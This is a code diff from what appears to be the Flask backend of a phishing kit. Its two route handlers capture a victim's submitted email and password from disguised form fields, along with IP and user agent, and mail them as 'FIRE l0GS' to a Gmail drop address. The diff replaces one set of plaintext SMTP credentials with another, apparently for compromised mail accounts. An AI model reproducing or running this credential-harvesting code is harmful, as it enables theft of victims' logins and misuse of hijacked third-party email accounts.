@@ -446,10 +446,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'Info@divinehoney.in'
-        sender_emaill = 'info'
+        sender_email = 'Northamerica.warangal@xcelgs.com'
+        sender_emaill = 'Northamerica.warangal'
         receiver_email = 'aklapciukas.powercargo.uk@gmail.com'
-        password = 'Divine@1234#'
+        password = 'Xcelgs@2022'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -468,7 +468,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.divinehoney.in', 465) as server:
+        with smtplib.SMTP_SSL('mail.xcelgs.com', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -487,10 +487,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'Info@divinehoney.in'
-        sender_emaill = 'Info'
+        sender_email = 'Northamerica.warangal@xcelgs.com'
+        sender_emaill = 'Northamerica.warangal'
         receiver_email = 'aklapciukas.powercargo.uk@gmail.com'
-        password = 'Divine@1234#'
+        password = 'Xcelgs@2022'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -509,7 +509,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.divinehoney.in', 465) as server:
+        with smtplib.SMTP_SSL('mail.xcelgs.com', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
